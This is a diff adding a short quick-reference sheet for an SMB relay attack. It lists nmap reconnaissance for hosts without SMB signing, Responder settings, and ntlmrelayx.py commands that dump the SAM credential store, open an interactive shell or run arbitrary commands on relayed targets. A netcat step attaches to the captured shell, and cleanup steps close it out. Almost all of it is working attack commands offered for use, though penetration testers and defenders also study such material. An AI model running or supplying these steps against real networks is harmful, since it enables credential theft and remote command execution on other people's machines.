@@ -1,0 +1,17 @@
+SMB RELAY - QUICK REF
+
+Pre-check: nmap --script smb2-security-mode -p 445 <subnet>/<cidr>
+           → only relay to hosts where signing is "not required"
+
+1.  Edit /etc/responder/Responder.conf  →  SMB = Off  |  HTTP = Off
+2.  Build targets.txt (one signing-disabled IP per line)
+3a. sudo ntlmrelayx.py -tf targets.txt -smb2support              (dump SAM)
+3b. sudo ntlmrelayx.py -tf targets.txt -smb2support -i           (interactive shell)
+3c. sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<cmd>"   (run command)
+4.  sudo responder -I <interface> -rdw
+5.  Wait for victim broadcast → relay fires automatically
+6.  [option B] nc 127.0.0.1 11000  to connect to the SMB shell
+7.  Ctrl+C in both terminals (no ARP cleanup needed)
+
+[optional] If you set a static IP before the attack, restore with:
+    sudo nmcli con mod "<connection>" ipv4.method auto && sudo nmcli con up "<connection>"
